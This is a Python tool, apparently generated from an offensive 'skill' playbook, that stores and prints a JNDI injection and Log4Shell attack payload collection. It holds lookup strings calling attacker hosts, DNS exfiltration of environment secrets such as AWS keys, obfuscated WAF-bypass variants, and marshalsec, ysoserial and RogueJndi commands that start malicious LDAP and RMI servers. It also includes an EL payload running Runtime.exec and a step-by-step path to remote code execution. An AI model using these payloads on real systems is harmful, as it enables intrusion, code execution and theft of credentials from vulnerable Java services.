#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/jndi-injection

Skill: SKILL: JNDI Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-jndi-injection.py --help
      python hack-skills-jndi-injection.py --list
      python hack-skills-jndi-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/jndi-injection'
TITLE = 'SKILL: JNDI Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: jndi-injection", "description: >-", "JNDI injection playbook. Use when Java applications perform JNDI lookups with attacker-controlled names, especially via Log4j2, Spring, or any code path reaching InitialContext.lookup()."],
    'skill-jndi-injection-expert-attack-playbook': [],
    '0-related-routing': ["- [deserialization-insecure](../deserialization-insecure/SKILL.md) when JNDI leads to deserialization (post-8u191 bypass path)", "- [expression-language-injection](../expression-language-injection/SKILL.md) when the JNDI sink is reached via SpEL or OGNL expression evaluation"],
    '1-core-mechanism': ["JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).", "**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.", "```java", "// Vulnerable code pattern:", "String name = request.getParameter(\"resource\");", "Context ctx = new InitialContext();", "Object obj = ctx.lookup(name);  // name = \"ldap://attacker.com/Exploit\""],
    '2-attack-vectors': [],
    'rmi-remote-method-invocation': ["rmi://attacker.com:1099/Exploit", "Attacker runs an RMI server returning a `Reference` object pointing to a remote class:", "```java", "// Attacker's RMI server returns:", "Reference ref = new Reference(\"Exploit\", \"Exploit\", \"http://attacker.com/\");", "// JVM downloads http://attacker.com/Exploit.class and instantiates it"],
    'ldap': ["ldap://attacker.com:1389/cn=Exploit", "Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.", "LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI)."],
    'dns-detection-only': ["dns://attacker-dns-server/lookup-name", "Useful for confirming JNDI injection without RCE \u2014 triggers DNS query to attacker's authoritative NS."],
    '3-jdk-version-constraints-and-bypass': [],
    'post-8u191-bypass-ldap-serialized-gadget': ["Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally \u2014 if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.", "```bash"],
    'ysoserial-jrmplistener-approach': ["java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"id\""],
    'then-jndi-lookup-points-to-rmi-attacker-1099-whatever': [],
    'post-8u191-bypass-beanfactory-el': ["When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:", "javaClassName: javax.el.ELProcessor", "javaFactory: org.apache.naming.factory.BeanFactory", "forceString: x=eval", "x: Runtime.getRuntime().exec(\"id\")"],
    '4-tooling': [],
    'marshalsec-jndi-reference-server': ["```bash"],
    'start-ldap-server-serving-a-remote-class': ["java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://attacker.com/#Exploit\" 1389"],
    'start-rmi-server': ["java -cp marshalsec.jar marshalsec.jndi.RMIRefServer \"http://attacker.com/#Exploit\" 1099"],
    'the-exploit-refers-to-exploit-class-hosted-at-http-attacker-com-exploit-class': [],
    'jndi-injection-exploit-all-in-one': ["```bash", "java -jar JNDI-Injection-Exploit.jar -C \"command\" -A attacker_ip"],
    'automatically-starts-rmi-ldap-servers-with-multiple-bypass-strategies': [],
    'rogue-jndi': ["```bash", "java -jar RogueJndi.jar --command \"id\" --hostname attacker.com"],
    'provides-rmi-ldap-and-http-servers-with-auto-generated-payloads': [],
    '5-log4j2-cve-2021-44228-log4shell': [],
    'mechanism': ["Log4j2 supports **Lookups** \u2014 expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:", "${jndi:ldap://attacker.com/x}", "**Any logged string** containing this pattern triggers the vulnerability \u2014 User-Agent, form fields, HTTP headers, URL paths, error messages."],
    'detection-payloads': ["```text", "${jndi:ldap://TOKEN.collab.net/a}", "${jndi:dns://TOKEN.collab.net}", "${jndi:rmi://TOKEN.collab.net/a}"],
    'exfiltrate-environment-info-via-dns': ["${jndi:ldap://${sys:java.version}.TOKEN.collab.net}", "${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}", "${jndi:ldap://${hostName}.TOKEN.collab.net}"],
    'waf-bypass-variants': ["Log4j2's lookup parser is very flexible:", "```text", "${${lower:j}ndi:ldap://attacker.com/x}", "${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}", "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}", "${j${::-n}di:ldap://attacker.com/x}", "${jndi:l${lower:D}ap://attacker.com/x}", "${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}"],
    'split-log-bypass-advanced': ["When WAF detects paired `${jndi:...}` in a single request, split across two log entries:", "```text"],
    'request-1-logged-first': ["X-Custom: ${jndi:ldap://attacker.com/"],
    'request-2-logged-second': ["X-Custom: exploit}", "If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers."],
    'real-world-case-solr-log4shell': ["```bash"],
    'confirm-via-dnslog-solr-admin-cores-api': ["GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}"],
    'dns-hit-with-java-version-confirmed-log4shell-in-solr': [],
    'injection-points-to-test': ["```text", "User-Agent          X-Forwarded-For       Referer", "Accept-Language     X-Api-Version         Authorization", "Cookie values       URL path segments     POST body fields", "Search queries      File upload names     Form field names", "GraphQL variables   SOAP/XML elements     JSON values"],
    'affected-versions': ["- Log4j2 2.0-beta9 through 2.14.1", "- Fixed in 2.15.0 (partial), fully fixed in 2.17.0", "- Log4j 1.x is NOT affected (different lookup mechanism)"],
    '6-other-jndi-sinks-beyond-log4j': [],
    '7-testing-methodology': ["Suspected JNDI injection point?", "\u251c\u2500\u2500 Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}", "\u2502   \u2514\u2500\u2500 DNS hit? \u2192 Confirmed JNDI evaluation", "\u251c\u2500\u2500 Determine JDK version:", "\u2502   \u2514\u2500\u2500 ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}", "\u251c\u2500\u2500 JDK < 8u191?", "\u2502   \u251c\u2500\u2500 Start marshalsec LDAP server with remote class", "\u2502   \u2514\u2500\u2500 ${jndi:ldap://attacker:1389/Exploit} \u2192 direct RCE", "\u251c\u2500\u2500 JDK >= 8u191?", "\u2502   \u251c\u2500\u2500 LDAP \u2192 serialized gadget (need gadget chain on classpath)", "\u2502   \u251c\u2500\u2500 BeanFactory + EL (need Tomcat on classpath)", "\u2502   \u2514\u2500\u2500 JRMPListener via ysoserial", "\u2514\u2500\u2500 WAF blocking ${jndi:...}?", "\u2514\u2500\u2500 Try obfuscation: ${${lower:j}ndi:...}"],
    '8-quick-reference': ["```text"],
    'safe-confirmation-dns-only': ["${jndi:dns://TOKEN.collab.net}"],
    'ldap-rce-jdk-8u191': ["${jndi:ldap://ATTACKER:1389/Exploit}"],
    'version-exfiltration': ["${jndi:ldap://${sys:java.version}.TOKEN.collab.net}"],
    'log4shell-with-waf-bypass': ["${${lower:j}ndi:${lower:l}dap://ATTACKER/x}"],
    'start-ldap-reference-server': ["java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://ATTACKER/#Exploit\" 1389"],
    'post-8u191-ysoserial-jrmp': ["java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"id\""],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()